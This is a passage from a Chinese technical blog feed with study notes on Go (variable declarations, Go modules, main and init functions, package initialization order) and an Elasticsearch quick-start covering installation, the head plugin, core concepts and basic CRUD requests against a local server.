class="string">"hello, gopher!"</span>)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 Go 中，声明一个变量有多种方式，具体使用哪一种，需要根据实际情况而定：是包级变量还是局部变量、是否需要延迟初始化、是否接受默认类型、是否是分支控制变量等</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221101174926.png" alt=""></p><p>通用变量声明和语法糖的区别在于，语法糖声明可以省略变量的类型信息。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——认识Go Module</title>
      <link href="/go-language-study-notes-get-to-know-go-module/"/>
      <url>/go-language-study-notes-get-to-know-go-module/</url>
      
        <content type="html"><![CDATA[<p>Go module 构建模式是在 Go 1.11 版本正式引入的，为的是<strong>彻底解决 Go 项目复杂版本依赖的问题</strong>，在 Go 1.16 版本中，Go module 已经成为了 Go 默认的包依赖管理机制和 Go 源码构建机制。</p><a id="more"></a><p>Go Module 的核心是一个名为 <code>go.mod</code> 的文件，在这个文件中存储了这个 module 对第三方依赖的全部信息。</p><h2 id="go-module"><a href="#go-module" class="headerlink" title="go module"></a>go module</h2><p>首先来创建一个 <code>hellomodule.go</code> 的源文件。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hellomodule.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"github.com/valyala/fasthttp"</span></span><br><span class="line"><span class="string">"go.uber.org/zap"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> logger *zap.Logger</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">logger, _ = zap.NewProduction()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fastHTTPHandler</span><span class="params">(ctx *fasthttp.RequestCtx)</span></span> &#123;</span><br><span class="line">logger.Info(<span class="string">"hello, go module"</span>, zap.ByteString(<span class="string">"uri"</span>, ctx.RequestURI()))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fasthttp.ListenAndServe(<span class="string">":8081"</span>, fastHTTPHandler)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先不用在意每行代码的意思，只需要知道在这个示例中，通过 import 引入了两个第三方依赖库。</p><p>接下来，通过下面命令为 “hellomodule” 这个示例程序添加 <code>go.mod</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ go mod init hellomodule</span><br><span class="line">go: creating new go.mod: module hellomodule</span><br><span class="line">go: to add module requirements and sums:</span><br><span class="line">  go mod tidy</span><br></pre></td></tr></table></figure><p><code>go mod init</code> 命令的执行结果是在当前目录下生成了一个 <code>go.mod</code> 文件，查看一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat go.mod</span><br><span class="line"></span><br><span class="line">module hellomodule</span><br><span class="line"></span><br><span class="line">go 1.18</span><br></pre></td></tr></table></figure><p>其实，一个 module 就是一个包的集合，这些包和 module 一起打版本、发布和分发。<br><code>go.mod</code> 所在的目录被我们称为它声明的 module 的根目录。</p><p>有了 <code>go.mod</code> 之后，还不能立马构建 “hellomodule” ，因为需要添加源码依赖，也就是代码中用到的 fasthttp 和 zap 这两个第三方包。</p><p>使用以下命令自动添加：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ go mod tidy</span><br></pre></td></tr></table></figure><p>再次查看 <code>go.mod</code> 文件，就会发现多了很多内容：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat <span class="keyword">go</span>.mod</span><br><span class="line"></span><br><span class="line">module hellomodule</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="number">1.18</span></span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">        github.com/valyala/fasthttp v1<span class="number">.41</span><span class="number">.0</span></span><br><span class="line">        <span class="keyword">go</span>.uber.org/zap v1<span class="number">.23</span><span class="number">.0</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">        github.com/andybalholm/brotli v1<span class="number">.0</span><span class="number">.4</span> <span class="comment">// indirect</span></span><br><span class="line">        github.com/klauspost/compress v1<span class="number">.15</span><span class="number">.9</span> <span class="comment">// indirect</span></span><br><span class="line">        github.com/valyala/bytebufferpool v1<span class="number">.0</span><span class="number">.0</span> <span class="comment">// indirect</span></span><br><span class="line">        <span class="keyword">go</span>.uber.org/atomic v1<span class="number">.7</span><span class="number">.0</span> <span class="comment">// indirect</span></span><br><span class="line">        <span class="keyword">go</span>.uber.org/multierr v1<span class="number">.6</span><span class="number">.0</span> <span class="comment">// indirect</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>还会发现本地多了一个 <code>go.sum</code> 的文件，它的作用是记录项目的直接依赖和间接依赖包的相关版本的 hash 值，用来校验本地包的真实性。<br>在构建的时候，如果本地依赖包的 hash 值与 <code>go.sum</code> 文件中记录的不一致，就会被拒绝构建。</p><p>现在就可以进行编译了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ go build hellomodule.go</span><br><span class="line">$ ls</span><br><span class="line">go.mod    go.sum    hellomodule*    hellomodule.go</span><br><span class="line"></span><br><span class="line">$ ./hellomodule</span><br></pre></td></tr></table></figure><p>启动服务，然后访问 <code>localhost:8081</code>，可以看到控制台输出以下内容，即表示服务正常</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"level"</span>:<span class="string">"info"</span>,<span class="attr">"ts"</span>:<span class="number">1667202109.444561</span>,<span class="attr">"caller"</span>:<span class="string">"hellomodule/hellomodule.go:14"</span>,<span class="attr">"msg"</span>:<span class="string">"hello, go module"</span>,<span class="attr">"uri"</span>:<span class="string">"/"</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>Go 源码需要先编译，再分发和运行</li><li>如果是单 Go 源文件的情况，可以直接使用 go build 命令 + Go 源文件名的方式编译</li><li>对于复杂的 Go 项目，需要在 Go Module 的帮助下完成项目的构建</li><li>Go Module 已经是 go 官方标准包依赖管理和构建模式了，gopath 模式了解即可</li><li><code>go mod init</code> 命令为项目创建一个 Go Module</li><li><code>go mod tidy</code> 命令自动添加第三方依赖</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——入口函数与初始化次序</title>
      <link href="/go-language-study-notes-entry-function-and-initialization-order/"/>
      <url>/go-language-study-notes-entry-function-and-initialization-order/</url>
      
        <content type="html"><![CDATA[<p>Go 程序由一系列 Go 包组成，代码的执行是在各个包之间来回跳转。<br>和其他语言一样，Go 也拥有自己的用户层入口——<strong>main 函数</strong>，通过 main 入口函数，逐步了解 Go 程序的执行次序。</p><a id="more"></a><h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h2><p>Go 语言中有一个特殊的函数：<strong>main 包中的 main 函数</strong>，也就是 <strong>main.main</strong>，它是所有 Go 可执行程序的用户层执行逻辑的入口函数。</p><p>Go 程序在用户层面的执行逻辑，会在这个函数内按照它的调用顺序展开。</p><p>main 函数的函数原型是这样的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 用户层执行逻辑</span></span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 函数的函数原型非常简单，没有参数也没有返回值。</p><p>而且，Go 语言要求：<strong>可执行程序的 main 包必须定义 main 函数，否则 Go 编译器会报错</strong>——“runtime.main_main·f: function main is undeclared in the main package”。</p><p>不过需要注意的是，并不是只有 main 包中才允许有 main 函数，其他包中也是可以拥有名为 main 的函数或者方法，只是因为其可见性规则，非 main 包中自定义的 main 函数仅限于包内使用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> pkg1</span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    main()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里 main 函数就主要是用来在包 pkg1 内部使用的，它是没法在包外使用的</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"main func for pkg1"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="init-函数"><a href="#init-函数" class="headerlink" title="init 函数"></a>init 函数</h2><p>不过对于 main 包的 main 函数来说，还有一点需要明确，就是<strong>它虽然是用户层逻辑的入口函数，但它却不一定是用户层第一个被执行的函数</strong>。</p><p>这是因为Go 语言还有一个特殊函数的存在——init 函数，它的作用是<strong>对包进行初始化</strong>。</p><p>和 main.main 函数一样，init 函数也是一个无参数无返回值的函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 包初始化逻辑</span></span><br><span class="line">    <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 <strong>main 包依赖的包中定义了 init 函数</strong>，或者是 <strong>main 包自身定义了 init 函数</strong>，那么 Go 程序在这个包初始化的时候，就会自动调用它的 init 函数，因此这些 init 函数的执行就都会发生在 main 函数之前。</p><p>注意：init 函数不用显式调用，否则会编译错误——“undefined: init”。</p><h2 id="Go-包的初始化次序"><a href="#Go-包的初始化次序" class="headerlink" title="Go 包的初始化次序"></a>Go 包的初始化次序</h2><p>从程序逻辑结构角度来看，Go 包是程序逻辑封装的基本单位，每个包可以理解成是一个“自治”的、封装良好的、对外部暴露有限接口的基本单元。</p><p>一个 Go 程序就是由一组包组成的，程序的初始化就是这些包的初始化。每个包拥有自己的依赖包、变量、常量、init 函数、（main 函数）等。</p><p>可以借助下面这张图来加深对初始化次序的理解。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221101155442.png" alt=""></p><p>首先，main 包依赖 pkg1、pkg4 这两个包，所以第一步，Go 会根据包的导入顺序，依次去初始化 main 包下面的依赖包。</p><p>第二步，Go 在进行包初始化的过程中，会采用<strong>深度优先</strong>的原则，递归初始化各个包的依赖包。<br>对应到上图，也就是 pkg1 依赖 pkg2，pkg2 依赖 pkg3，pkg3 没有依赖包，于是 Go 在 pkg3 包中按照<strong>常量 -&gt; 变量 -&gt; init 函数</strong>的顺序先对 pkg3 包进行初始化（这个就是深度优先原则，从内往外依次初始化）。</p><p>紧接着，在 pkg3 包初始化完毕后，Go 会回到 pkg2 包并对 pkg2 包进行初始化，接下来再回到 pkg1 包并对 pkg1 包进行初始化。在调用完 pkg1 包的 init 函数后，Go 就完成了 main 包的第一个依赖包 pkg1 的初始化。</p><p>接下来，Go 会初始化 main 包的第二个依赖包 pkg4，pkg4 包的初始化过程与 pkg1 包类似，也是先初始化它的依赖包 pkg5，然后再初始化自身。</p><p>然后，当 Go 初始化完 pkg4 包后也就完成了对 main 包所有依赖包的初始化，接下来初始化 main 包自身。</p><p>最后，在 main 包中，Go 同样会按照<strong>常量 -&gt; 变量 -&gt; init 函数</strong>的顺序进行初始化，执行完这些初始化工作后才正式进入程序的入口函数 main 函数。</p><hr><p>对了，还有一点需要注意的是：<strong>如果一个包同时被多个包依赖，那么这个包仅会初始化一次</strong>。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关于 Go 包的初始化记住以下三点就行：</p><ul><li>依赖包按深度优先的次序进行初始化</li><li>每个包内按以<strong>常量 -&gt; 变量 -&gt; init 函数</strong>的顺序进行初始化</li><li>包内的多个 init 函数按出现次序进行自动调用</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ElasticSearch 快速上手</title>
      <link href="/elasticsearch-quick-start/"/>
      <url>/elasticsearch-quick-start/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.elastic.co/cn/" target="_blank" rel="noopener">Elasticsearch</a> 是目前全文搜索引擎的首选，它可以快速地储存、搜索和分析海量数据，下面简称 ES。</p><a id="more"></a><p>ES 底层是开源库 Lucene。但是没法直接用 Lucene，必须自己写代码去调用它的接口。ES 是 Lucene 的封装，提供了 REST API 的操作接口，开箱即用。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>ES 需要 Java 8 环境。如果你的机器还没安装 Java，可以进行<a href="https://www.java.com/en/download/" target="_blank" rel="noopener">下载安装</a>。</p><p>ES 的安装比较简单，直接<a href="https://www.elastic.co/cn/downloads/elasticsearch" target="_blank" rel="noopener">下载</a>对应版本的压缩包解压即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.4.3-darwin-x86_64.tar.gz</span><br><span class="line">curl https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.4.3-darwin-x86_64.tar.gz.sha512 | shasum -a 512 -c - </span><br><span class="line">tar -xzf elasticsearch-8.4.3-darwin-x86_64.tar.gz</span><br></pre></td></tr></table></figure><p>这里下载安装的是最新版本 <code>8.4.3</code>。</p><p>首次解压完并不能直接运行，需要稍微修改一些配置（如果你的机器有配置证书则可以忽略，这是因为 ES 默认开启了 <code>ssl</code> 认证）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; vim elasticsearch.yml</span><br><span class="line">xpack.security.enabled: false</span><br></pre></td></tr></table></figure><p>进入解压后的目录，运行下面的命令，启动 ES：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/elasticsearch</span><br></pre></td></tr></table></figure><p>如果这时报错 “max virtual memory areas vm.maxmapcount [65530] is too low”，要运行下面的命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w vm.max_map_count=262144</span><br></pre></td></tr></table></figure><p>如果一切正常，ES 就会在默认的 9200 端口运行，访问<code>localhost:9200</code>会返回如下信息：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span> : <span class="string">"192.168.123.11"</span>,</span><br><span class="line">  <span class="attr">"cluster_name"</span> : <span class="string">"elasticsearch"</span>,</span><br><span class="line">  <span class="attr">"cluster_uuid"</span> : <span class="string">"GUgWHb9ERuOo230FP2os4g"</span>,</span><br><span class="line">  <span class="attr">"version"</span> : &#123;</span><br><span class="line">    <span class="attr">"number"</span> : <span class="string">"8.4.3"</span>,</span><br><span class="line">    <span class="attr">"build_flavor"</span> : <span class="string">"default"</span>,</span><br><span class="line">    <span class="attr">"build_type"</span> : <span class="string">"tar"</span>,</span><br><span class="line">    <span class="attr">"build_hash"</span> : <span class="string">"42f05b9372a9a4a470db3b52817899b99a76ee73"</span>,</span><br><span class="line">    <span class="attr">"build_date"</span> : <span class="string">"2022-10-04T07:17:24.662462378Z"</span>,</span><br><span class="line">    <span class="attr">"build_snapshot"</span> : <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"lucene_version"</span> : <span class="string">"9.3.0"</span>,</span><br><span class="line">    <span class="attr">"minimum_wire_compatibility_version"</span> : <span class="string">"7.17.0"</span>,</span><br><span class="line">    <span class="attr">"minimum_index_compatibility_version"</span> : <span class="string">"7.0.0"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"tagline"</span> : <span class="string">"You Know, for Search"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="head-插件安装"><a href="#head-插件安装" class="headerlink" title="head 插件安装"></a>head 插件安装</h2><p><a href="https://github.com/mobz/elasticsearch-head" target="_blank" rel="noopener">elasticsearch-head</a> 是一个ES 集群的 Web 前端控制台，可以可视化管理 ES。</p><p>安装也是非常简单，直接下载解压运行即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone git:&#x2F;&#x2F;github.com&#x2F;mobz&#x2F;elasticsearch-head.git</span><br><span class="line">cd elasticsearch-head</span><br><span class="line">npm install</span><br><span class="line">npm run start</span><br></pre></td></tr></table></figure><p>elasticsearch-head 默认监听 9100 端口，正常访问 <code>localhost:9100</code> 会看到如下界面：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221021211444.png" alt=""><br>注意看，我这里的集群健康值是 red，索引的旁边出现了一个 <code>unassigned</code>，出现 <code>unassigned</code> 的原因通常有：</p><ol><li>磁盘空间不足（控制磁盘使用的高水位。默认为90%）</li><li>nodes 数小于分片副本数</li><li>节点失联</li></ol><p>健康值有三个值：</p><ul><li>green</li><li>yellow</li><li>red</li></ul><p>如果处于 red，很多操作是做不了的，我这里是因为磁盘空间不足而导致的，释放掉磁盘空间之后便恢复 green 了：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221022164249.png" alt=""></p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="Node-与-Cluster"><a href="#Node-与-Cluster" class="headerlink" title="Node 与 Cluster"></a>Node 与 Cluster</h3><p>ES 本质上是一个分布式的数据库，允许多台服务器协同工作，每台服务器也可以同时运行多个实例。</p><p>单个 ES 实例称为一个节点（node）。一组节点构成一个集群（cluster）。</p><h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p>Index 是 ES 的核心概念，ES 会索引所有字段，经过处理后写入一个反向索引（Inverted Index）。查找数据的时候，直接查找该索引。</p><p>ES 数据管理的顶层单位就叫做 Index（索引）。它是单个数据库的同义词。每个 Index （即数据库）的名字必须是小写。</p><h3 id="Document"><a href="#Document" class="headerlink" title="Document"></a>Document</h3><p>Index 里面单条的记录称为 Document（文档）。许多条 Document 构成了一个 Index。</p><p>Document 使用 JSON 格式表示，下面是一个例子：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"李四"</span>,</span><br><span class="line">  <span class="attr">"gender"</span>: <span class="string">"男"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Type"><a href="#Type" class="headerlink" title="Type"></a>Type</h3><h2 id="数据操作"><a href="#数据操作" class="headerlink" title="数据操作"></a>数据操作</h2><h3 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h3><p>创建 Index，可以直接向 ES 服务器发出 PUT 请求。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个 weather 的 Index</span></span><br><span class="line">curl -X PUT <span class="string">'localhost:9200/customer'</span></span><br></pre></td></tr></table></figure><h3 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h3><p>通过 DELETE 请求删除 Index</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X DELETE <span class="string">'localhost:9200/weather'</span></span><br></pre></td></tr></table></figure><h3 id="新增记录"><a href="#新增记录" class="headerlink" title="新增记录"></a>新增记录</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">"localhost:9200/customer/_doc/1?pretty"</span> -H <span class="string">'Content-Type: application/json'</span> -d<span class="string">'</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  "name": "李四",</span></span><br><span class="line"><span class="string">  "gender": "男"</span></span><br><span class="line"><span class="string">&#125;'</span></span><br></pre></td></tr></table></figure><p><code>pretty</code> 参数的作用是以易读的格式返回。</p><p>注意，这里请求地址是<code>customer/_doc/1</code>，最后的1是该条记录的 Id。它不一定是数字，任意字符串（比如abc）都可以。</p><p>新增记录的时候，也可以不指定 Id，这时要改成 POST 请求。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">"localhost:9200/customer/_doc?pretty"</span> -H <span class="string">'Content-Type: application/json'</span> -d<span class="string">'</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  "name": "张三",</span></span><br><span class="line"><span class="string">  "gender": "男"</span></span><br><span class="line"><span class="string">&#125;'</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"_index"</span> : <span class="string">"customer"</span>,</span><br><span class="line">  <span class="string">"_id"</span> : <span class="string">"-c3r_oMBDokqbW4aIGss"</span>,</span><br><span class="line">  <span class="string">"_version"</span> : 1,</span><br><span class="line">  <span class="string">"result"</span> : <span class="string">"created"</span>,</span><br><span class="line">  <span class="string">"_shards"</span> : &#123;</span><br><span class="line">    <span class="string">"total"</span> : 2,</span><br><span class="line">    <span class="string">"successful"</span> : 1,</span><br><span class="line">    <span class="string">"failed"</span> : 0</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"_seq_no"</span> : 3,</span><br><span class="line">  <span class="string">"_primary_term"</span> : 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是，使用该请求方式时，如果对应的索引不存在（例子中是<code>customer</code>），ES 则会自动创建该索引。</p><h3 id="查看记录"><a href="#查看记录" class="headerlink" title="查看记录"></a>查看记录</h3><p>通过 <code>elasticsearch-head</code> 查看数据：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221022171045.png" alt=""></p><p>通过终端指定 Document ID 查看对应的记录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">"localhost:9200/customer/_doc/1?pretty"</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"_index"</span> : <span class="string">"customer"</span>,</span><br><span class="line">  <span class="string">"_id"</span> : <span class="string">"1"</span>,</span><br><span class="line">  <span class="string">"_version"</span> : 3,</span><br><span class="line">  <span class="string">"_seq_no"</span> : 2,</span><br><span class="line">  <span class="string">"_primary_term"</span> : 1,</span><br><span class="line">  <span class="string">"found"</span> : <span class="literal">true</span>,</span><br><span class="line">  <span class="string">"_source"</span> : &#123;</span><br><span class="line">    <span class="string">"name"</span> : <span class="string">"李四"</span>,</span><br><span class="line">    <span class="string">"gender"</span> : <span class="string">"男"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回的数据中，found字段表示查询成功，<code>_source</code> 字段返回原始记录。如果 Id 不正确，就查不到数据，found字段就是false。</p><h3 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">"localhost:9200/customer/_doc/1?pretty"</span> -H <span class="string">'Content-Type: application/json'</span> -d<span class="string">'</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  "name": "王五",</span></span><br><span class="line"><span class="string">  "gender": "男"</span></span><br><span class="line"><span class="string">&#125;'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"_index"</span> : <span class="string">"customer"</span>,</span><br><span class="line">  <span class="string">"_id"</span> : <span class="string">"1"</span>,</span><br><span class="line">  <span class="string">"_version"</span> : 2,</span><br><span class="line">  <span class="string">"result"</span> : <span class="string">"updated"</span>,</span><br><span class="line">  <span class="string">"_shards"</span> : &#123;</span><br><span class="line">    <span class="string">"total"</span> : 2,</span><br><span class="line">    <span class="string">"successful"</span> : 1,</span><br><span class="line">    <span class="string">"failed"</span> : 0</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"_seq_no"</span> : 4,</span><br><span class="line">  <span class="string">"_primary_term"</span> : 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，将原始数据从”李四”改成“王五”。 返回结果里面，有几个字段发生了变化。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 